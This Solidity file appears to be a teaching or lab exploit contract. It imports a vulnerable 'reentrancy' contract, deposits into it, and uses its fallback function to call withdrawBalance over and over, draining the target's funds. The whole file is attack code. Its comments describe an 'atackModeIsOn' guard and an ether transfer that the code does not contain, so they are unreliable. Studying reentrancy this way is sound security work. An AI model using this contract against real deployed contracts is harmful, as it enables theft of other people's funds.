import "./reentrancy.sol";

contract attack_reent {
    
    
    event bug(string msg);
    
    reentrancy public vulnerable_contract;

    
    function deposit(address _vulnerable_contract, uint amount) public payable{
        vulnerable_contract = reentrancy(_vulnerable_contract) ;
        // call addToBalance with msg.value ethers
        vulnerable_contract.addToBalance(amount);
    }

    function launch_attack(uint wamt) public{
        emit bug('launch');
        // call withdrawBalance
        // withdrawBalance calls the fallback of ReentranceExploit
        vulnerable_contract.withdrawBalance(wamt);
    }  


    fallback () external payable{
        emit bug('Bug Triggered');
        // atackModeIsOn is used to execute the attack only once
        // otherwise there is a loop between withdrawBalance and the fallback function
        vulnerable_contract.withdrawBalance(2);
    }

    

}